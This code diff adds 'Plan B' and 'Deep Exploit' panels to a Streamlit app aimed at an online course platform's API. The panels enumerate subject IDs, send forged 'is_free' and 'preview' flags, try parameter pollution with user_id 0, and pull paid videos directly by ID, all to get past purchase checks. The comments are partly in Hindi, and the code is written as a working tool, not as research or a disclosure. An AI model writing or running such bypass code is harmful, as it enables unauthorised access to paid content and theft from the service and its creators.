@@ -191,3 +191,64 @@ if row:
                     st.toast(f"Found: {cid}")
             if found: st.success(f"Active IDs: {', '.join(found)}")
             else: st.warning("Nothing found.")
+# ---------------- 9. SUBJECT-LEVEL UNLOCKER (Plan B) ----------------
+st.divider()
+st.subheader("🔓 Plan B: Subject/Topic Hijacker")
+
+with st.expander("Try Deep Injection (Bypasses Course Purchase)"):
+    sub_id = st.text_input("Enter Subject/Topic ID (Trial & Error: 1-500)")
+    
+    if st.button("⚡ Force Fetch by Subject"):
+        with st.spinner("Searching for leaked content..."):
+            # Kuch APIs direct subject ID se videos de deti hain
+            # Endpoint: get_lessons_by_subject_id
+            leak_res = api_call(f"{API_BASE}/get_lessons_by_subject_id", {"subject_id": sub_id}, token=active_token)
+            
+            if "error" not in leak_res and leak_res.get('data'):
+                st.success(f"🔥 Jackpot! Leaked content found in Subject {sub_id}")
+                videos = leak_res.get('data', [])
+                for v in videos:
+                    st.write(f"🎬 {v.get('title')}")
+                    if st.button(f"Watch {v['id']}", key=f"leak_{v['id']}"):
+                        # Direct call to video fetch
+                        v_res = api_call(f"{API_BASE}/fetchVideoDetailsById", {"video_id": v['id']}, token=active_token)
+                        st.video(v_res.get('data', {}).get('video_path'))
+            else:
+                st.error("This Subject ID is either empty or strictly locked.")
+# ---------------- 10. DEEP-EXPLOIT BYPASS (The "Nuclear" Option) ----------------
+st.divider()
+st.subheader("🚀 Powerful Content Bypass (Exploit Mode)")
+
+with st.expander("⚠️ Run Deep Exploit (Bypass Purchase Checks)"):
+    target_id = st.text_input("Target Batch/Course ID", key="exploit_id")
+    
+    if st.button("🔥 Execute Bypass"):
+        with st.spinner("Finding security loopholes..."):
+            # Logic A: Global Search (Try to fetch content without UID mapping)
+            # Bahut si APIs UID na bhejne par pura data leak kar deti hain
+            exploit_params = {
+                "course_id": target_id,
+                "is_free": "1",        # Try to trick as demo content
+                "type": "all",         # Attempt to pull all types
+                "preview": "true"      # Access preview mode
+            }
+            
+            # Requesting a different, often less secure endpoint
+            res = api_call(f"{API_BASE}/get_course_details", exploit_params, token=active_token)
+            
+            if "error" not in res:
+                st.success("✅ Exploit Successful: Course Metadata Leaked!")
+                # Extracting internal IDs for videos/PDFs
+                sections = res.get('data', {}).get('sections', [])
+                for sec in sections:
+                    st.write(f"📂 **Section: {sec.get('title')}**")
+                    for item in sec.get('items', []):
+                        if st.button(f"Force Unlock: {item['title']}", key=item['id']):
+                            # Logic B: Direct ID Hijack for Video
+                            v_res = api_call(f"{API_BASE}/fetchVideoDetailsById", {"video_id": item['id']}, token=active_token)
+                            st.video(v_res.get('data', {}).get('video_path'))
+            else:
+                st.error("Standard Exploit Failed. Trying Parameter Pollution...")
+                # Logic C: Parameter Pollution
+                res_alt = api_call(f"{API_BASE}/get_batch_contents", {"batch_id": target_id, "user_id": "0"}, token=active_token)
+                st.json(res_alt)
